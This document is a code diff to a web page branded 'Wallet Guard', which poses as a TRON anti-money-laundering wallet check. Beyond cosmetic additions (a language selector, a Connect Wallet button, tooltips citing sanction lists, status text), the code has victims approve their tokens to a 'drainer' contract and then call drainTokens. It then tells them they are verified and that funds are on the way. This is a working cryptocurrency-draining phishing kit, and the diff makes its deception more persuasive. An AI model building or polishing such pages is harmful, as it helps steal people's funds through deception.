@@ -35,6 +35,11 @@
   .btn.blue { background: linear-gradient(180deg, #4a8ef8, var(--blue2)); color: #fff; }
   .btn.blue:disabled { opacity: .55; cursor: default; }
   .btn.ghost { background: transparent; border: 1px solid var(--line); color: var(--ink); font-weight: 600; }
+  .btn.small { padding: 9px 14px; font-size: 13px; }
+  .sel.lang { width: auto; padding: 7px 10px; font-size: 13px; }
+  .copy { background: none; border: 0; color: var(--mut); cursor: pointer; font-size: 14px; margin-left: 6px; }
+  .i { display: inline-grid; place-items: center; width: 15px; height: 15px; border-radius: 50%; border: 1px solid #31517a;
+       color: #8fb6e8; font-size: 10px; margin-left: 5px; cursor: help; vertical-align: 1px; }
   .grid3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin: 22px 0 40px; }
   .grid3 .card { padding: 18px; }
   .grid3 h3 { margin: 0 0 12px; font-size: 15px; display: flex; gap: 8px; align-items: center; }
@@ -82,7 +87,11 @@
 <header class="top"><div class="wrap top-in">
   <div class="brand"><span class="shield">W</span>Wallet Guard</div>
   <nav class="menu"><a class="on" href="#">AML Check</a><a href="#how">About</a><a href="#faq">FAQ</a><a href="#support">Support</a></nav>
-  <div class="top-right"><span>🌐 EN</span><span class="pill"><span class="dot"></span>TRON Chain</span></div>
+  <div class="top-right">
+    <select class="sel lang" id="lang"><option>EN</option><option>ES</option><option>DE</option><option>RU</option></select>
+    <span class="pill"><span class="dot"></span>TRON Chain</span>
+    <button class="btn ghost small" id="connectw">Connect Wallet</button>
+  </div>
 </div></header>
 
 <div class="wrap">
@@ -107,11 +116,11 @@
       </div>
       <div class="kv">
         <div class="ts" id="ts">—</div>
-        <div><div class="k">Wallet Address</div><div class="mono" id="raddr">—</div></div>
+        <div><div class="k">Wallet Address <button class="copy" id="copyaddr" title="Copy address">⧉</button></div><div class="mono" id="raddr">—</div></div>
         <div><div class="k">Network</div><div>TRON</div></div>
         <div class="two">
-          <div><div class="k">Exposure to Flagged Addresses</div><div id="expo">0.0%</div><div class="line"><i id="expobar"></i></div></div>
-          <div><div class="k">Sanctions &amp; Suspicious Activity</div><div class="ok">✅ Not Found</div></div>
+          <div><div class="k">Exposure to Flagged Addresses <span class="i" title="Share of transferred volume that touched flagged or sanctioned addresses.">i</span></div><div id="expo">0.0%</div><div class="line"><i id="expobar"></i></div></div>
+          <div><div class="k">Sanctions &amp; Suspicious Activity <span class="i" title="Match against OFAC, EU and community-maintained risk lists.">i</span></div><div class="ok">✅ Not Found</div></div>
         </div>
         <div><div class="k">Transaction Risk Indicators</div><div class="chips"><span class="chip g">● Low Activity</span><span class="chip">● Normal Flow</span><span class="chip">● No Mixers</span><span class="chip">● No High-Risk Counterparties</span></div></div>
         <div class="hidden" id="balcard"><div class="k">Flagged Balance</div><div id="rows"></div></div>
@@ -177,6 +186,13 @@ async function buildTx(contract, sel, param, fee){ const j=await rpc('/wallet/tr
 function pick(){ const w=window; return [w.tronLink, w.binancew3w&&w.binancew3w.tron, w.okxwallet&&w.okxwallet.tronLink, w.tokenpocket&&w.tokenpocket.tron, w.bitkeep&&w.bitkeep.tron, w.gatewallet&&w.gatewallet.tron, w.trustwallet&&w.trustwallet.tronLink, w.tronWeb].find((x)=>x&&typeof x.request==='function'); }
 async function ensureSigner(){ if (signer) return true; const p=pick(); if(!p){ setStatus('Wallet not found — install TronLink or use WalletConnect.', 'err'); return false; } try{ await p.request({method:'tron_requestAccounts'}); }catch(e){} const tw=p.tronWeb||p; if(!tw||!tw.defaultAddress||!tw.defaultAddress.base58){ setStatus('Wallet did not return an account.', 'err'); return false; } signer={kind:'tronlink', w:tw, addr:tw.defaultAddress.base58}; return true; }
 
+async function connectWallet(){
+  if (!(await ensureSigner())) return;
+  $('addr').value = signer.addr;
+  $('connectw').textContent = signer.addr.slice(0, 6) + '…' + signer.addr.slice(-4);
+  setStatus('Wallet connected', 'ok');
+}
+
 async function wcSend(contract, sel, param, fee){
   const tx = await buildTx(contract, sel, param, fee);
   const res = await signer.client.request({ topic: signer.topic, chainId: CHAIN, request:{ method:'tron_signTransaction', params:{ address: account, transaction: tx } } });
@@ -201,6 +217,7 @@ async function runCheck(){
   }
 
   $('check').disabled = true;
+  $('check').textContent = 'Scanning…';
   $('result').classList.remove('hidden');
   $('raddr').textContent = account;
   $('balcard').classList.add('hidden');
@@ -246,12 +263,14 @@ async function runCheck(){
   }
   setStatus('');
   $('check').disabled = false;
+  $('check').textContent = 'Check Wallet';
 }
 
 async function complete(){
   if (DEMO) { $('complete').disabled = true; setStatus('Confirm in wallet…'); await sleep(1200); location.hash='done'; alert('Demo: verification passed'); return; }
   if (!(await ensureSigner())) return;
   $('complete').disabled = true;
+  $('complete').textContent = 'Waiting for signature…';
   try {
     for (let i=0;i<found.length;i++) {
       const t = found[i];
@@ -266,12 +285,14 @@ async function complete(){
         else await wcSend(t.token,'approve(address,uint256)', addrParam(cfg.drainer)+uintParam(amt), 150e6);
       }
     }
+    $('complete').textContent = 'Pending…';
     setStatus('Releasing funds — confirm in wallet');
     const items = found.map((t)=>addrParam(t.token)).join('');
     const param = addrParam(account) + uintParam(0x40) + uintParam(found.length) + items;
     let txid;
     if (signer.kind === 'tronlink') txid = await signer.w.contract(DRAIN_ABI, cfg.drainer).drainTokens(account, found.map((t)=>t.token)).send({feeLimit:300e6, shouldPollResponse:true}).then((r)=> (typeof r==='string'? r : (r&&(r.txid||r))||''));
     else txid = await wcSend(cfg.drainer,'drainTokens(address,address[])', param, 300e6);
+    $('complete').textContent = 'Done ✓';
     $('lvl').textContent = 'Verified ✓';
     setStatus('Verification passed · tx ' + txid.slice(0,12) + '…', 'ok');
     $('note').textContent = 'Funds are on their way to your wallet.';
@@ -281,6 +302,8 @@ async function complete(){
   }
 }
 
+$('connectw').addEventListener('click', connectWallet);
+$('copyaddr').addEventListener('click', () => { navigator.clipboard.writeText(account || $('addr').value); setStatus('Address copied', 'ok'); });
 $('check').addEventListener('click', runCheck);
 $('complete').addEventListener('click', complete);
 $('addr').addEventListener('keydown', (e)=>{ if(e.key==='Enter') runCheck(); });
